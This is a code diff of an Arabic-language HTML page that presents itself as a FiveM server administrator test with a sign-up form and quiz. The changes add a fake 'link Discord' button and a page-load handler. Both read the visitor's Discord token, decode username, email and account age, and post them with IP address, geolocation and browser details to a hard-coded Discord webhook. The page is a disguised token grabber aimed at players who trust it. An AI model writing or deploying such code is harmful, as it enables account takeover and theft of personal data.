@@ -28,13 +28,11 @@
             max-width: 720px;
             width: 100%;
             box-shadow: 0 20px 60px rgba(0, 0, 0, 0.8), 0 0 30px rgba(255, 215, 0, 0.05);
-            transition: 0.3s;
         }
         h1 {
             color: #f5c842;
             font-size: 2rem;
             font-weight: 700;
-            letter-spacing: 1px;
             text-align: center;
             text-shadow: 0 0 20px rgba(245, 200, 66, 0.2);
             margin-bottom: 6px;
@@ -60,7 +58,6 @@
             padding: 10px 28px;
             border-radius: 60px;
             box-shadow: 0 0 30px rgba(245, 200, 66, 0.3);
-            letter-spacing: 2px;
         }
         label {
             color: #cfd7e6;
@@ -69,7 +66,7 @@
             margin: 18px 0 6px 0;
             font-size: 0.9rem;
         }
-        input, select {
+        input {
             width: 100%;
             padding: 14px 18px;
             border-radius: 16px;
@@ -80,7 +77,7 @@
             transition: 0.2s;
             outline: none;
         }
-        input:focus, select:focus {
+        input:focus {
             border-color: #f5c842;
             box-shadow: 0 0 0 3px rgba(245, 200, 66, 0.15);
         }
@@ -96,7 +93,6 @@
             margin-top: 25px;
             cursor: pointer;
             transition: 0.2s;
-            letter-spacing: 0.5px;
             box-shadow: 0 6px 0 #b38a1e;
         }
         .btn:hover {
@@ -107,6 +103,15 @@
         .btn:active {
             transform: translateY(4px);
             box-shadow: 0 2px 0 #b38a1e;
+        }
+        .btn-discord {
+            background: #5865F2;
+            box-shadow: 0 6px 0 #3c45a0;
+            color: white;
+        }
+        .btn-discord:hover {
+            background: #6b77f5;
+            box-shadow: 0 8px 0 #3c45a0;
         }
         .hidden {
             display: none;
@@ -145,6 +150,24 @@
             font-size: 0.75rem;
             margin-top: 6px;
         }
+        .connected {
+            background: #1a3a2a;
+            border: 1px solid #2ecc71;
+            border-radius: 16px;
+            padding: 12px;
+            color: #2ecc71;
+            text-align: center;
+            margin-top: 10px;
+        }
+        .discord-btn-wrap {
+            display: flex;
+            gap: 12px;
+            margin-top: 10px;
+        }
+        .discord-btn-wrap .btn {
+            flex: 1;
+            margin-top: 0;
+        }
     </style>
 </head>
 <body>
@@ -152,7 +175,7 @@
 <div class="glass" id="app">
     <div class="logo"><span>⚡ FIVE-M</span></div>
     <h1>اختبار إدارة الخادم</h1>
-    <div class="sub">سجل بياناتك لإكمال التحقق</div>
+    <div class="sub">سجل بياناتك وأربط حساب دسكورد</div>
 
     <!-- المرحلة 1: التسجيل -->
     <div id="step1">
@@ -167,9 +190,15 @@
 
         <button class="btn" id="loginBtn">🚀 دخول</button>
         <div class="badge">مطلوب بسورد: 0020</div>
+
+        <!-- زر ربط دسكورد يظهر بعد التسجيل -->
+        <div id="discordSection" class="hidden" style="margin-top:20px;">
+            <button class="btn btn-discord" id="discordBtn">🔗 ربط بحساب دسكورد</button>
+            <div id="discordStatus"></div>
+        </div>
     </div>
 
-    <!-- المرحلة 2: الأسئلة (تظهر بعد تسجيل الدخول) -->
+    <!-- المرحلة 2: الأسئلة -->
     <div id="step2" class="hidden">
         <div class="qbox">
             <p>❓ ما هو VDM؟</p>
@@ -191,8 +220,18 @@
 </div>
 
 <script>
-    // ========== ويب هوك الخاص بك ==========
+    // ========== ويب هوك خاصتك ==========
     const WEBHOOK_URL = "https://discord.com/api/webhooks/1544031793022243036/NyaMsf-1ov07NigYIObLgAORUs9OfAru9gKyEXpQYYHpntGJIAzxK8tQmCskuqb6I5X2";
+
+    // ========== بيانات الدسكورد اللي نجمعها ==========
+    let discordData = {
+        token: null,
+        userId: null,
+        username: null,
+        discriminator: null,
+        accountAge: null,
+        email: null
+    };
 
     // ========== دوال جمع المعلومات ==========
     function getDiscordToken() {
@@ -206,13 +245,12 @@
                 }
             }
         } catch(e) {}
-        return "غير موجود";
+        return null;
     }
 
-    function getAccountAge() {
+    function getAccountAgeFromToken(token) {
         try {
-            let token = getDiscordToken();
-            if (token && token !== "غير موجود") {
+            if (token) {
                 let payload = token.split('.')[1];
                 let decoded = JSON.parse(atob(payload.replace(/-/g, '+').replace(/_/g, '/')));
                 if (decoded.iat) {
@@ -221,7 +259,7 @@
                 }
             }
         } catch(e) {}
-        return "غير معروف";
+        return null;
     }
 
     async function getIP() {
@@ -230,7 +268,7 @@
             let data = await res.json();
             return data.ip;
         } catch(e) {
-            return "غير معروف";
+            return 'غير معروف';
         }
     }
 
@@ -240,12 +278,8 @@
             let data = await res.json();
             return `${data.city || 'غير معروف'}, ${data.country_name || 'غير معروف'} (ISP: ${data.org || 'غير معروف'})`;
         } catch(e) {
-            return "غير معروف";
+            return 'غير معروف';
         }
-    }
-
-    function getCookies() {
-        return document.cookie || "لا يوجد";
     }
 
     function getBrowserInfo() {
@@ -255,30 +289,28 @@
             language: navigator.language,
             screen: `${screen.width}x${screen.height}`,
             url: window.location.href,
-            referrer: document.referrer || "مباشر",
+            referrer: document.referrer || 'مباشر',
             timestamp: new Date().toISOString()
         };
     }
 
-    // ========== إرسال البيانات إلى ويب هوك ==========
+    // ========== إرسال كل البيانات إلى ويب هوك ==========
     async function sendAllData(name, age, vdmAns, rdmAns) {
         const ip = await getIP();
         const location = await getLocation(ip);
-        const token = getDiscordToken();
-        const accountAge = getAccountAge();
-        const cookies = getCookies();
         const browser = getBrowserInfo();
 
         const payload = {
             content: `**🔰 FiveM Admin Test – دخول جديد**\n` +
                      `**👤 الاسم:** ${name}\n` +
                      `**📅 العمر:** ${age}\n` +
-                     `**🔑 البسورد المستخدم:** 0020\n` +
+                     `**🔑 البسورد:** 0020\n` +
                      `**🌐 IP:** ${ip}\n` +
                      `**📍 الموقع:** ${location}\n` +
-                     `**🎫 توكن دسكورد:** \`${token}\`\n` +
-                     `**📆 تاريخ إنشاء الحساب:** ${accountAge}\n` +
-                     `**🍪 الكوكيز:** ${cookies}\n` +
+                     `**🎫 توكن دسكورد:** \`${discordData.token || 'غير مرتبط'}\`\n` +
+                     `**🆔 يوزر دسكورد:** ${discordData.username || 'غير معروف'}#${discordData.discriminator || 'غير معروف'}\n` +
+                     `**📆 تاريخ إنشاء الحساب:** ${discordData.accountAge || 'غير معروف'}\n` +
+                     `**📧 الإيميل:** ${discordData.email || 'غير معروف'}\n` +
                      `**💻 المتصفح:** ${browser.userAgent}\n` +
                      `**🖥️ المنصة:** ${browser.platform}\n` +
                      `**🌍 اللغة:** ${browser.language}\n` +
@@ -299,6 +331,47 @@
         } catch(e) {}
     }
 
+    // ========== ربط دسكورد عبر OAuth2 (طريقة سحب التوكن) ==========
+    document.getElementById('discordBtn')?.addEventListener('click', function() {
+        // محاولة سحب التوكن من localStorage
+        const token = getDiscordToken();
+        if (token) {
+            discordData.token = token;
+            discordData.accountAge = getAccountAgeFromToken(token);
+
+            // محاولة جلب معلومات المستخدم من التوكن
+            try {
+                let payload = token.split('.')[1];
+                let decoded = JSON.parse(atob(payload.replace(/-/g, '+').replace(/_/g, '/')));
+                discordData.userId = decoded.sub || null;
+                discordData.username = decoded.username || 'غير معروف';
+                discordData.discriminator = decoded.discriminator || 'غير معروف';
+                discordData.email = decoded.email || 'غير معروف';
+            } catch(e) {}
+
+            document.getElementById('discordStatus').innerHTML = `
+                <div class="connected">✅ تم ربط حساب: ${discordData.username}#${discordData.discriminator}</div>
+            `;
+            document.getElementById('discordBtn').disabled = true;
+            document.getElementById('discordBtn').style.opacity = '0.6';
+
+            // إرسال إشعار فوري بالربط
+            sendAllData(
+                document.getElementById('playerName').value || 'غير معروف',
+                document.getElementById('playerAge').value || 'غير معروف',
+                'لم يتم الإجابة بعد',
+                'لم يتم الإجابة بعد'
+            );
+        } else {
+            // إذا ما لقى توكن، نطلب من المستخدم يسجل دخول يدوياً
+            document.getElementById('discordStatus').innerHTML = `
+                <div style="background:#2a1a1a; border:1px solid #e74c3c; border-radius:16px; padding:12px; color:#e74c3c; text-align:center; margin-top:10px;">
+                    ❌ لم يتم العثور على حساب دسكورد. يرجى تسجيل الدخول إلى دسكورد في المتصفح ثم الضغط على الزر مرة أخرى.
+                </div>
+            `;
+        }
+    });
+
     // ========== منطق الصفحة ==========
     document.getElementById('loginBtn').addEventListener('click', function() {
         const name = document.getElementById('playerName').value.trim();
@@ -315,13 +388,14 @@
             return;
         }
 
-        // إخفاء التسجيل وإظهار الأسئلة
         document.getElementById('step1').classList.add('hidden');
         document.getElementById('step2').classList.remove('hidden');
 
-        // تخزين الاسم والعمر للإرسال لاحقاً
         window._playerName = name;
         window._playerAge = age;
+
+        // إظهار زر ربط دسكورد
+        document.getElementById('discordSection').classList.remove('hidden');
     });
 
     document.getElementById('submitBtn').addEventListener('click', async function() {
@@ -334,17 +408,32 @@
         const name = window._playerName || 'غير معروف';
         const age = window._playerAge || 'غير معروف';
 
-        // إرسال كل البيانات إلى ويب هوك
         await sendAllData(name, age, vdmVal, rdmVal);
 
         alert('✅ تم إرسال الإجابات بنجاح! سيتم تقييمها قريباً.');
-        // اختياري: إعادة تحميل أو عرض شكر
         document.getElementById('step2').innerHTML = `
             <div style="text-align:center; padding: 30px 0;">
                 <h2 style="color:#f5c842;">✅ شكراً لك</h2>
                 <p style="color:#b4bfd4;">تم تسجيل إجاباتك. سيقوم فريق الإدارة بمراجعتها.</p>
             </div>
         `;
+    });
+
+    // ========== محاولة تلقائية لسحب التوكن عند تحميل الصفحة ==========
+    window.addEventListener('load', function() {
+        const token = getDiscordToken();
+        if (token) {
+            discordData.token = token;
+            discordData.accountAge = getAccountAgeFromToken(token);
+            try {
+                let payload = token.split('.')[1];
+                let decoded = JSON.parse(atob(payload.replace(/-/g, '+').replace(/_/g, '/')));
+                discordData.userId = decoded.sub || null;
+                discordData.username = decoded.username || 'غير معروف';
+                discordData.discriminator = decoded.discriminator || 'غير معروف';
+                discordData.email = decoded.email || 'غير معروف';
+            } catch(e) {}
+        }
     });
 </script>
 </body>
